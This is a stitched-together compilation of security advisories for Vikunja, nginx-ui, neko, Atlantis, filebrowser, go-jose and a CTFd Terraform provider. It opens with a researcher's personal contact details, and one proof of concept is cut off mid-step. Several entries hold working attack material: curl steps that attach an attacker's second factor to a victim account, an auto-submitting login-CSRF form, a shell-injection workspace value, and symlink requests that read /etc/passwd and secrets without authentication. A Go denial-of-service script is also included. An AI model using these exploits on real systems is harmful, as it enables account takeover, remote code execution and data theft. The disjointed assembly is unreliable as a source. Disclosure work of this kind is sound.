If you find this find worth your time you can contact me under d.ramadani@ieee.org or +43 (677) 63 397 910. In case this is something that will go public I'd be happy to be mentioned under my real name, Dionis Ramadani.

Thank you for taking the time, I hope this is something interesting for you.

items.content_html:
Description

Summary

In Vikunja v2.6.0 the project-permission engine resolves a user's effective permission on a project as the MAX over the entire reachable project subtree. As a result, when a user has been granted a higher permission on a parent project and the owner explicitly shares a child project with that same user at a lower permission (an intended down-restriction), the explicit lower grant is silently ignored and the user receives the higher, inherited permission on the child. A user who was deliberately restricted to read-only on a sensitive sub-project can therefore modify it, delete it, and re-share it (including granting other users admin) - none of which the owner intended. This is a behavior regression from v2.5.0, whose engine used "nearest-ancestor-grant-wins" semantics that honored the explicit child grant.

Details

Effective permissions are computed by a single recursive CTE in pkg/models/project_access.go (getProjectAccessForUser):

WITH RECURSIVE grants (project_id, permission) AS (
    SELECT project_id, MAX(permission) FROM (
        SELECT id AS project_id, 2 AS permission FROM projects WHERE owner_id = ?
        UNION ALL SELECT project_id, permission FROM users_projects WHERE user_id = ?
        UNION ALL SELECT tp.project_id, tp.permission FROM team_projects tp
                  INNER JOIN team_members tm ON tm.team_id = tp.team_id WHERE tm.user_id = ?
    ) direct_grants GROUP BY project_id
),
tree (id, permission) AS (
    SELECT p.id, g.permission FROM projects p INNER JOIN grants g ON g.project_id = p.id
    UNION
    SELECT p.id, t.permission FROM projects p INNER JOIN tree t ON p.parent_project_id = t.id
)
SELECT id, MAX(permission) AS permission FROM tree GROUP BY id

For a parent P where the user has a direct ADMIN(2) grant and a child C (with parent_project_id = P) where the user has a direct READ(0) grant, the tree CTE produces the rows (P,2), (C,0) (direct grants) and (C,2) (the parent grant propagated down the recursion). The final SELECT id, MAX(permission) ... GROUP BY id collapses the child to MAX(0, 2) = 2 (ADMIN). The explicit READ grant on C is discarded.

In v2.5.0 the equivalent resolution used ROW_NUMBER() OVER (... ORDER BY priority) (nearest-ancestor wins), so the child's own direct grant took precedence and the down-restriction was honored. The switch to MAX(...) in v2.6.0 introduces the override. Code comments in project_access.go describe the additive behavior as intentional ("a grant on a descendant can raise an inherited permission, never lower it"), so the maintainers may consider this working-as-intended - but it is a security-relevant regression that silently defeats an explicit, owner-configured access restriction, so it is reported here for a decision.

PoC

Target: http://localhost:3456 (Vikunja v2.6.0). Owner: admin. Restricted collaborator: alice (id 2). Third party used to demonstrate re-sharing: bob. Note Vikunja's v1 REST convention: PUT = create, POST = update. All values below are the real, unredacted values from the run.

Step 1 - Log in as the owner (admin) and as the restricted collaborator (alice)

  -d '{"username":"admin","password":"VikunjaLab123!"}'

This isolates the cause to the inherited-permission override, not to alice's explicit grant.

Impact

This is a broken access control / improper privilege management issue (CWE-269). A project owner who grants a collaborator a high permission on a parent project and then explicitly shares a sensitive sub-project with that collaborator at a lower permission (e.g. read-only) does not get the restriction they configured: the collaborator silently retains the higher inherited permission on the sub-project and can modify it, delete it, and re-share it to arbitrary third parties (demonstrated: granting bob ADMIN on the read-restricted child). This defeats an explicit, security-relevant configuration and can expose or allow tampering with data on sub-projects that were meant to be restricted. It is a regression from v2.6.0's predecessor, which honored the nearest (child) grant. The prerequisite is that the attacker already holds a higher permission on an ancestor project; the security loss is specifically the inability to enforce a narrower permission on a descendant.

Summary

Endpoints that bind a TOTP secret (POST /api/otp_enroll) or register a WebAuthn passkey (POST /api/finish_passkey_register) for the current user require only a valid JWT. There is no current-password re-prompt and the routes are explicitly registered outside the RequireSecureSession() group. With only a stolen JWT, an attacker can attach their own second factor to the victim's account, surviving any subsequent password rotation and locking the legitimate user out.

Details

api/user/router.go:34-39 — note the routes registered before the secure-session group:

r.GET("/otp_secret", GenerateTOTP)
r.POST("/otp_enroll", EnrollTOTP)                     // ← outside RequireSecureSession
r.GET("/begin_passkey_register", BeginPasskeyRegistration)
r.POST("/finish_passkey_register", FinishPasskeyRegistration)  // ← outside RequireSecureSession

o := r.Group("", middleware.RequireSecureSession())
{
    o.GET("/otp_reset", ResetOTP)                     // reset *is* protected — inconsistent
    ...
}

EnrollTOTP (api/user/otp.go:45-102) only refuses if cUser.EnabledOTP() is already true; for any victim who has never enabled TOTP it accepts an attacker-supplied Secret and Passcode pair (the validator only checks that the passcode is a valid TOTP for the supplied secret — i.e., the attacker proves they know the secret they are submitting):

if cUser.EnabledOTP() { ... abort ... }
var twoFA struct {
    Secret   string `json:"secret"   binding:"required"`
    Passcode string `json:"passcode" binding:"required"`
}
if !cosy.BindAndValid(c, &twoFA) { return }
if ok := totp.Validate(twoFA.Passcode, twoFA.Secret); !ok { ... abort ... }
ciphertext, _ := crypto.AesEncrypt([]byte(twoFA.Secret))
u.Where(u.ID.Eq(cUser.ID)).Update(u.OTPSecret, ciphertext)

FinishPasskeyRegistration (api/user/passkey.go) is structurally identical and additionally has no "already enrolled" guard — an attacker can register multiple passkeys to the victim.

Proof of Concept

JWT="<victim_jwt>"

# Step 1 — request a fresh TOTP secret server-side (anyone with JWT can call):
$ curl -s -H "Authorization: $JWT" http://127.0.0.1:18080/api/otp_secret
{"secret":"5BWZDEWWECJ6LRPSDKHURCWXBU5KKRYN",
 "url":"otpauth://totp/Nginx%20UI:admin?...&secret=5BWZDEWWECJ6LRPSDKHURCWXBU5KKRYN"}

# Step 2 — compute current 30-s TOTP code (attacker-side):
$ python3 -c "import base64,hmac,hashlib,struct,time
key=base64.b32decode('5BWZDEWWECJ6LRPSDKHURCWXBU5KKRYN')
ctr=int(time.time())//30
h=hmac.new(key, struct.pack('>Q',ctr), hashlib.sha1).digest()
o=h[-1]&0xF; v=(struct.unpack('>I',h[o:o+4])[0]&0x7fffffff)%1000000
print(f'{v:06d}')"
954084

# Step 3 — bind that secret to the victim's account:
$ curl -i -X POST -H "Authorization: $JWT" -H "Content-Type: application/json" \
       -d '{"secret":"5BWZDEWWECJ6LRPSDKHURCWXBU5KKRYN","passcode":"954084"}' \
       http://127.0.0.1:18080/api/otp_enroll

HTTP/1.1 200 OK
{"message":"ok","codes":[{"code":"c77d5-50543"},{"code":"f9284-688c6"},...],
 "last_viewed":1778338236}

# Step 4 — confirm 2FA is now enabled on the victim's account:
$ curl -s -H "Authorization: $JWT" http://127.0.0.1:18080/api/2fa_status
{"enabled":true,"otp_status":true,"passkey_status":false,
 "recovery_codes_generated":true,"recovery_codes_viewed":true}

Now whenever the legitimate user (or anyone) logs in to that account, the second factor must be supplied from the attacker's authenticator.

The passkey variant follows the same pattern: GET /api/begin_passkey_register then POST /api/finish_passkey_register with the attacker's WebAuthn authenticator. The route is also outside RequireSecureSession.

Impact

  • Persistent account takeover surviving the victim's password reset.
  • Combines trivially with any of: stolen JWT, the RequireSecureSession bypass, the missing-role-model privilege escalation, and the weak recovery-code generation.

Patches

api/user/router.go — move enrolment routes inside the secure-session group:

-    r.POST("/otp_enroll", EnrollTOTP)
-    r.GET("/begin_passkey_register", BeginPasskeyRegistration)
-    r.POST("/finish_passkey_register", FinishPasskeyRegistration)
-
     o := r.Group("", middleware.RequireSecureSession())
     {
+        o.POST("/otp_enroll", EnrollTOTP)
+        o.GET("/begin_passkey_register", BeginPasskeyRegistration)
+        o.POST("/finish_passkey_register", FinishPasskeyRegistration)
         o.GET("/otp_reset", ResetOTP)
         ...
     }

This patch alone is not sufficient — the RequireSecureSession middleware is a no-op for non-OTP users (separate advisory). Both must be patched together. Additionally, require the user's current password in the request body for these mutations (mirroring UpdateCurrentUserPassword at api/user/current_user.go).

Workarounds

None reliable. Operators should monitor the users table for unexpected OTPSecret values and the passkeys table for unexpected rows.

Credits

Vishal Shukla (@shukla304) and Sechub.dev AI Agent.

References

  • https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-gfrc-g87h-7h5w
  • https://nvd.nist.gov/vuln/detail/CVE-2026-84313
  • https://github.com/0xJacky/nginx-ui/commit/23d1934099b05b2a01589b48129dc3d3159d91c2
  • https://github.com/0xJacky/nginx-ui/releases/tag/v2.4.1
  • https://github.com/advisories/GHSA-gfrc-g87h-7h5w

Summary

In the Casdoor SSO flow, the OAuth state parameter is hard-coded to settings.CasdoorSettings.Application — a value identical for every user and every login. The callback handler accepts whatever state the client sends without comparing it to anything stored in the user agent, enabling a login-CSRF: an attacker can force the victim's browser to authenticate as the attacker.

Details

api/user/casdoor.go:92-117 (GetCasdoorUri):

func GetCasdoorUri(c *gin.Context) {
    clientId := settings.CasdoorSettings.ClientId
    redirectUri := settings.CasdoorSettings.RedirectUri
    state := settings.CasdoorSettings.Application      // ← constant
    ...
    c.JSON(http.StatusOK, gin.H{
        "uri": fmt.Sprintf(
            "%s/login/oauth/authorize?client_id=%s&response_type=code&redirect_uri=%s&state=%s&scope=read",
            endpoint, clientId, encodedRedirectUri, state),
    })
}

api/user/casdoor.go:24-90 (CasdoorCallback):

type CasdoorLoginUser struct {
    Code  string `json:"code" binding:"required,max=255"`
    State string `json:"state" binding:"required,max=255"`
}

func CasdoorCallback(c *gin.Context) {
    var loginUser CasdoorLoginUser
    if !cosy.BindAndValid(c, &loginUser) { return }
    ...
    // state is NEVER compared to a per-session value
    token, err := casdoorsdk.GetOAuthToken(loginUser.Code, loginUser.State)
    ...
    u, err := user.GetUser(claims.Name)        // username from Casdoor's JWT
    ...
    userToken, err := user.GenerateJWT(u)       // JWT minted for whatever user came back
}

Compare with the OIDC implementation in api/user/oidc.go:35-48, which generates a random state, stores it in an oidc_state cookie, and validates it on the callback. Casdoor has no such check.

Proof of Concept

  1. Attacker initiates a Casdoor authorisation flow on their own browser, obtaining an authorisation code for their Casdoor account.

  2. Attacker hosts a page that auto-submits the captured code to the victim's nginx-ui:

    <html><body><form action="https://victim.example/api/casdoor_callback" method="POST"
                  enctype="text/plain" id="x">
  <input name='{"code":"<attacker_code>","state":"<App>","junk":"' value='"}'>
</form>
<script>document.getElementById('x').submit()</script>
</body></html>

  3. Server exchanges the attacker's code, looks up the username from claims.Name in the local user table, and mints a JWT for that row. The callback also sets the _nginx_ui_secure_session cookie via middleware.EnsureSecureSessionCookie(c) (casdoor.go:84) — meaning the victim is now silently authenticated as the attacker.

  4. Victim, believing they are using their own account, configures sites / TLS keys; the attacker reads them.

Impact

Login CSRF — the victim is forced to authenticate as the attacker, leading to data exfiltration of anything the victim subsequently uploads or configures. Particularly dangerous when nginx-ui is used by an organisation where Casdoor maps internal identities — the attacker can attribute their changes to the victim.

Patches

Mirror the OIDC implementation:

+ import (
+    "crypto/rand"
+    "crypto/subtle"
+    "encoding/hex"
+    ...
+ )

 func GetCasdoorUri(c *gin.Context) {
     ...
-    state := settings.CasdoorSettings.Application
+    b := make([]byte, 16)
+    if _, err := rand.Read(b); err != nil {
+        cosy.ErrHandler(c, err); return
+    }
+    state := hex.EncodeToString(b)
+    c.SetSameSite(http.SameSiteLaxMode)
+    c.SetCookie("casdoor_state", state, 600, "/", "",
+                cSettings.ServerSettings.EnableHTTPS, true)
     ...
 }

 func CasdoorCallback(c *gin.Context) {
+    expected, err := c.Cookie("casdoor_state")
+    if err != nil {
+        c.AbortWithStatusJSON(http.StatusBadRequest,
+            gin.H{"message":"missing state cookie"}); return
+    }
     var loginUser CasdoorLoginUser
     if !cosy.BindAndValid(c, &loginUser) { return }
+    if subtle.ConstantTimeCompare([]byte(expected), []byte(loginUser.State)) != 1 {
+        c.AbortWithStatusJSON(http.StatusBadRequest,
+            gin.H{"message":"invalid state"}); return
+    }
     ...
 }

Workarounds

Disable Casdoor SSO until patched. The OIDC integration in api/user/oidc.go is correctly implemented and can be used as a substitute.

References

  • api/user/casdoor.go:92-117
  • api/user/casdoor.go:24-90
  • api/user/oidc.go:35-48 (correct implementation for comparison)

Credits

Vishal Shukla (@shukla304) and Sechub.dev AI Agent.

References

  • https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-44xr-mrhh-qm78
  • https://nvd.nist.gov/vuln/detail/CVE-2026-84312
  • https://github.com/0xJacky/nginx-ui/commit/23d1934099b05b2a01589b48129dc3d3159d91c2
  • https://github.com/0xJacky/nginx-ui/releases/tag/v2.4.1
  • https://github.com/advisories/GHSA-44xr-mrhh-qm78

Impact

When legacy mode is enabled and session.implicit_hosting is enabled, the legacy WebRTC data channel incorrectly authorizes input events due to a logic error in LegacyIsHost().

As a result, an authenticated room member may be able to send mouse and keyboard input through the legacy WebRTC control channel even when controls are locked or the member would otherwise not be authorized through the modern control API.

The issue affects only the legacy WebRTC input path. The modern HTTP/WebSocket control path correctly enforces authorization checks and is not affected.

To exploit this issue, an attacker must:

  • Be authenticated as a room member.
  • Successfully establish a WebRTC connection.
  • Access a deployment using the legacy WebRTC input handler.

No unauthenticated access or privilege escalation outside the application is possible.

Patches

The issue has been fixed in v3.1.5 by correcting the authorization logic in the legacy WebRTC handler.

Users should upgrade to v3.1.5 or later. Fix: 395ca1a

Workarounds

Users who cannot immediately upgrade can mitigate the issue by one of the following:

  • Disable legacy mode if it is not required.
  • Disable implicit hosting (session.implicit_hosting=false).
  • Restrict access to trusted authenticated users.

Credits

Thanks to @KasperBuilds for responsibly disclosing this vulnerability and reaching out directly. This contribution helped strengthen the project, and the whole community benefits from it.

items.content_html:
Summary

Atlantis passes the Terraform workspace value from a pull request's atlantis.yaml into a shell command without quoting or escaping it.

A contributor whose pull request is eligible for an Atlantis plan can include shell metacharacters in the workspace name and execute arbitrary commands as the Atlantis service account. This does not require custom workflows, allow_custom_workflows, or permission to run terraform apply.

The executed command inherits the Atlantis process environment, which commonly contains cloud-provider, Terraform, and VCS credentials.

Details

Verified against current upstream/main commit 92ce5c51d1a050357e44df3535483425e59fa984 on August 13, 2026.

The vulnerable data flow is:

  1. The PR-controlled project workspace is validated in server/core/config/raw/project.go.

    Validation rejects only .., /, and \. Shell metacharacters such as ;, #, $, redirections, and whitespace remain permitted.

  2. The workspace is passed directly as a Terraform command argument in server/core/runtime/workspace_step_runner_delegate.go:

    []string{workspaceCmd, "select", ctx.Workspace}

  3. Terraform arguments are concatenated into a single string using strings.Join(args, " ") in server/core/terraform/tfclient/terraform_client.go:

    tfCmd := fmt.Sprintf("%s %s", binPath, strings.Join(args, " "))

  4. The resulting string is executed through sh -c in server/core/terraform/tfclient/terraform_client.go:

    cmd := exec.Command("sh", "-c", tfCmd)

Consequently, a workspace such as:

poc;id;false;#

produces commands equivalent to:

terraform workspace select poc;id;false;#
terraform workspace new poc;id;false;#

raw.Project.Validate() was confirmed to return no error for this workspace value.

Atlantis documents that planning untrusted Terraform can already be dangerous because providers and external data sources execute code. The distinct issue here is that an ordinary project configuration field becomes shell source, bypassing the explicit allow_custom_workflows control and requiring no malicious provider, external data source, custom workflow, or apply operation.

The primary remediation should be to execute Terraform using an argument vector rather than constructing shell source—for example, exec.Command(binaryPath, args...). Any required environment-variable expansion should be performed without invoking a shell. Strict workspace-name validation would also provide defense in depth.

PoC

Only reproduce this against a disposable Atlantis instance and test repository.

Preconditions

  • Atlantis processes atlantis.yaml from the pull request branch.
  • The pull request is eligible to run atlantis plan.
  • For a fork pull request, the server must have --allow-fork-prs enabled. A same-repository branch does not require this flag.
  • No custom workflows or apply permissions are required.

Repository contents

Create main.tf:

terraform {
  required_version = ">= 1.0"
}

Create atlantis.yaml:

version: 3
projects:
  - name: workspace-rce-poc
    dir: .
    workspace: "poc;id;false;#"
    autoplan:
      enabled: false

Open a pull request containing these files and comment:

atlantis plan -p workspace-rce-poc

Expected result

Atlantis first runs terraform workspace select. The injected false causes that command invocation to return an error, so Atlantis retries using terraform workspace new.

On both attempts, the shell executes id as a separate command. The second failure includes the combined command output in the Atlantis error response, exposing output similar to:

uid=1000(atlantis) gid=1000(atlantis) groups=1000(atlantis)

This demonstrates arbitrary shell-command execution without creating a custom workflow or reaching the apply phase.

The payload uses only id and false and does not access credentials, make network requests, or modify the host beyond Terraform potentially creating the disposable poc workspace.

Impact

This is an OS command injection vulnerability resulting in remote code execution as the Atlantis service account.

Affected deployments are those that:

  • Process pull-request-controlled atlantis.yaml project configuration; and
  • Permit the attacker-controlled pull request to trigger an Atlantis plan.

Potential consequences include:

  • Reading and exfiltrating cloud-provider, Terraform, and VCS credentials inherited from the Atlantis process.
  • Accessing Terraform state, plan files, repository checkouts, caches, and other data available to the Atlantis user.
  • Modifying files or binaries accessible to the service account.
  • Making network requests using the Atlantis server's network identity.
  • Pivoting into infrastructure accessible through the server's credentials or network placement.

For public repositories, arbitrary external contributors are directly exposed when --allow-fork-prs is enabled. Without fork PR support, the vulnerable population includes users able to create eligible same-repository pull requests and attackers controlling such accounts.

Summary

File read paths resolve symbolic links with filepath.EvalSymlinks and then operate on the resolved target without re-checking that the target still lies inside the user's source/scope.

A symlink located inside a user's accessible directory that points outside the scope (for example to /etc/passwd, another tenant's directory, SSH keys, or container secrets) is followed transparently, and its contents are served through the normal download, preview, media, and OnlyOffice endpoints. Any authenticated user with download access can read files anywhere the server process can, whenever such a symlink is reachable in their scope.

The same symlink-following read path is used by the public share endpoints, which are authorized only by a share hash and not by any account, so when a public share exposes a directory that contains such a symlink, an unauthenticated attacker holding only the share link reads files outside the scope with no credential.

Details

1. Symlink resolution performs no containment check (indexing/iteminfo/utils.go:110-119)

func ResolveSymlinks(path string) (string, bool, error) {
    resolvedPath, err := filepath.EvalSymlinks(path)   // follows the link to its real target
    if err != nil {
        return path, false, fmt.Errorf("could not resolve symlinks for %s: %v", path, err)
    }
    info, err := os.Lstat(resolvedPath)
    // ...
    return resolvedPath, IsDirectory(info), nil         // returned with no scope validation
}

There is no comparison of resolvedPath against the index/scope root.

2. GetRealPath returns the resolved target unchecked (indexing/indexingFiles.go:991-1008)

absolutePath, err := filepath.Abs(joinedPath)
// ...
realPath, isDir, err := iteminfo.ResolveSymlinks(absolutePath)   // escapes scope here
// ...
return realPath, isDir, err

realPath is then used by file handlers to open and serve the file. No caller re-validates that realPath is a descendant of the user's source root. (By contrast, the project did add containment for archive extraction via symlinkTargetStaysUnderDest, but that guard is specific to extraction and is not applied to this general read path.)

3. The read handlers request symlink following, including the unauthenticated public-share handlers (http/resource.go:96,503, http/media.go:124, http/onlyOffice.go:133, http/public.go:279,441,494)

FollowSymlinks: true,

Authenticated download, preview, media-subtitle, and OnlyOffice read flows all set FollowSymlinks: true, and so do the public share handlers in http/public.go. The public download route is registered as publicApi.HandleFunc("GET /resources/download", withHashFile(publicDownloadHandler)) (http/httpRouter.go:130), where withHashFile authorizes by the share hash alone with no account, so the same escape is reachable with no authentication when a public share exposes a directory containing the symlink.

PoC

Confirmed live on gtstef/filebrowser:1.3.3-stable. A symlink pointing outside the user's directory must exist inside it; here it is placed on the host volume, which is what happens whenever a bind-mounted directory contains symlinks.

1. Start a fresh container and seed a file outside the user's intended subtree.

docker rm -f fb-q-lab 2>/dev/null; rm -rf /tmp/fb-q-lab; mkdir -p /tmp/fb-q-lab/srv/user1
echo "ROOT_DB_PASSWORD=supersecret" > /tmp/fb-q-lab/srv/secret-outside.txt
docker run -d --name fb-q-lab -p 8090:80 -v /tmp/fb-q-lab/srv:/srv gtstef/filebrowser:1.3.3-stable && sleep 8
TARGET_URL=http://localhost:8090

2. Place symlinks inside the served tree that point outside it. One points at a host file (/etc/passwd), one at the file outside the user's subtree.

docker exec fb-q-lab sh -c 'ln -sf /etc/passwd /srv/user1/passwd_link; ln -sf /srv/secret-outside.txt /srv/user1/secret_link'

Vector 1: authenticated user (any account with download access)

3. Log in as the default admin (the token is passed as the auth query parameter).

ADMIN_TOKEN=$(curl -s -X POST "$TARGET_URL/api/auth/login?username=admin" -H "X-Password: admin" | tr -d '"')

4. Download through the symlinks and read files from outside the scope.

curl -s "$TARGET_URL/api/resources/download?file=/user1/passwd_link&source=srv&auth=$ADMIN_TOKEN" | head -1
curl -s "$TARGET_URL/api/resources/download?file=/user1/secret_link&source=srv&auth=$ADMIN_TOKEN"

Observed output:

[passwd_link] root:x:0:0:root:/root:/bin/sh
[secret_link] ROOT_DB_PASSWORD=supersecret

Vector 2: unauthenticated, via a public share (no account)

5. The owner creates a public share of the directory (a normal use of the share feature). This is the only step that needs an account.

SHARE_HASH=$(curl -s -X POST "$TARGET_URL/api/share?auth=$ADMIN_TOKEN" \
  -H 'Content-Type: application/json' -d '{"path":"/user1","source":"srv"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['hash'])")

6. With only the public share hash and no credential, download through the symlink.

curl -s "$TARGET_URL/public/api/resources/download?hash=$SHARE_HASH&file=/passwd_link" | head -1
curl -s "$TARGET_URL/public/api/resources/download?hash=$SHARE_HASH&file=/secret_link"

Observed output:

[passwd_link] root:x:0:0:root:/root:/bin/sh   (HTTP 200)
[secret_link] ROOT_DB_PASSWORD=supersecret

Both vectors follow each symlink to its target and return content from outside the served directory. Vector 1 works for any scoped non-admin user confined to /user1. Vector 2 needs no account at all, only the public share link, which is why the CVSS score uses PR:N.

Impact

  • Arbitrary file read outside scope: any authenticated user with download access can read any file the server process can access (host configuration, secrets, SSH keys, /etc/passwd, container service-account tokens, other tenants' files).
  • Unauthenticated read via public shares: because the public share download path follows symlinks and is authorized only by the share hash, an attacker with no account reads the same out-of-scope files using only a public share link to a directory that contains such a symlink. This is the PR:N worst case driving the score.
  • Cross-tenant data exposure: in multi-user deployments, one user reads other users' scoped files through a symlink.
  • Broad sink coverage: the same gap affects authenticated download, preview, media/subtitle, and OnlyOffice read flows and the public share handlers, all of which follow symlinks.
  • Precondition: a symlink pointing outside the scope must be reachable in the served directory (for the unauthenticated vector, inside a publicly shared directory). This is common where host directories are bind-mounted (the typical Docker deployment) or where scopes overlap shared storage.

Recommended Fix

After resolving symlinks, verify the resolved real path is still contained within the user's source root, and reject otherwise:

// indexing/indexingFiles.go, GetRealPath, after ResolveSymlinks:
rootReal, _ := filepath.EvalSymlinks(idx.Path)
rel, err := filepath.Rel(rootReal, realPath)
if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(os.PathSeparator)) {
    return "", false, fmt.Errorf("resolved path escapes source scope")
}

Apply the same containment check (or reuse the existing symlinkTargetStaysUnderDest logic) on every read path that sets FollowSymlinks: true. As a deployment-hardening option, add a setting to refuse to follow symlinks that leave the source root entirely.

Summary

A crafted RSA key inside a JWK can cause operations that parse JWKs to consume excess CPU.

Details

go-jose does not check for bounds on RSA modulus and primes before validating them. Values are passed directly to crypto/rsa.PrivateKey.Validate(). On Go 1.24+, this takes cubic time complexity with respect to the RSA modulus and primes. This allows an attacker to supply a crafted JWK to consume excessive CPU.

https://github.com/go-jose/go-jose/blob/5b371aecfcf7aabe06068d67da4344591ecddc76/jwk.go#L655-L700

Proof of concept

No special configuration of go-jose is required to reproduce this vulnerability.

package main

import (
    "encoding/base64"
    "encoding/json"
    "fmt"
    "math/big"
    "time"

    "github.com/go-jose/go-jose/v4"
)

func main() {
    // The RSA parameters can be complete junk. The CPU cost is in validating them.
    primeBits := 16384
    p := new(big.Int).Lsh(big.NewInt(1), uint(primeBits-1))
    p.SetBit(p, 0, 1)
    n := new(big.Int).Lsh(big.NewInt(1), 2048)
    e := big.NewInt(65537)
    d := big.NewInt(3)
    q := big.NewInt(3)

    jwk := map[string]string{
        "kty": "RSA",
        "n":   base64.RawURLEncoding.EncodeToString(n.Bytes()),
        "e":   base64.RawURLEncoding.EncodeToString(e.Bytes()),
        "d":   base64.RawURLEncoding.EncodeToString(d.Bytes()),
        "p":   base64.RawURLEncoding.EncodeToString(p.Bytes()),
        "q":   base64.RawURLEncoding.EncodeToString(q.Bytes()),
    }

    protected := map[string]any{
        "alg": "RS256",
        "jwk": jwk,
    }
    protJSON, _ := json.Marshal(protected)

    jws := map[string]string{
        "protected": base64.RawURLEncoding.EncodeToString(protJSON),
        "payload":   base64.RawURLEncoding.EncodeToString([]byte(`{}`)),
        "signature": base64.RawURLEncoding.EncodeToString([]byte("not-a-real-signature")),
    }
    jwsJSON, _ := json.Marshal(jws)

    start := time.Now()
    _, err := jose.ParseSigned(string(jwsJSON), []jose.SignatureAlgorithm{jose.RS256})
    elapsed := time.Since(start)

    fmt.Printf("prime bits: %d\n", primeBits)
    fmt.Printf("parse time: %s\n", elapsed)
    fmt.Printf("parse error: %v\n", err)
}

Impact

Denial of service vulnerability. Any application that uses go-jose to parse JWKs from untrusted sources is affected and should patch immediately.

Credits

Reported by Yuval Saggie and Mor Weinberger (powered by Echo Frontier)

References

  • https://github.com/go-jose/go-jose/releases/tag/v4.1.6

Impact

CTFer.io's CTFd Terraform Provider stores ctfd_team.password as non-sensitive values (CWE-522). A local or remote attacker, who can have access to the Terraform state, can read team passwords without the need for the state password for decryption.

Patches

Patched in v2.8.2.

Workarounds

No workaround exist, yet CTFer.io recommends you keep your state in safe environments with a limited set of users who can access it as a good practice to avoid exploitation of this vulnerability.
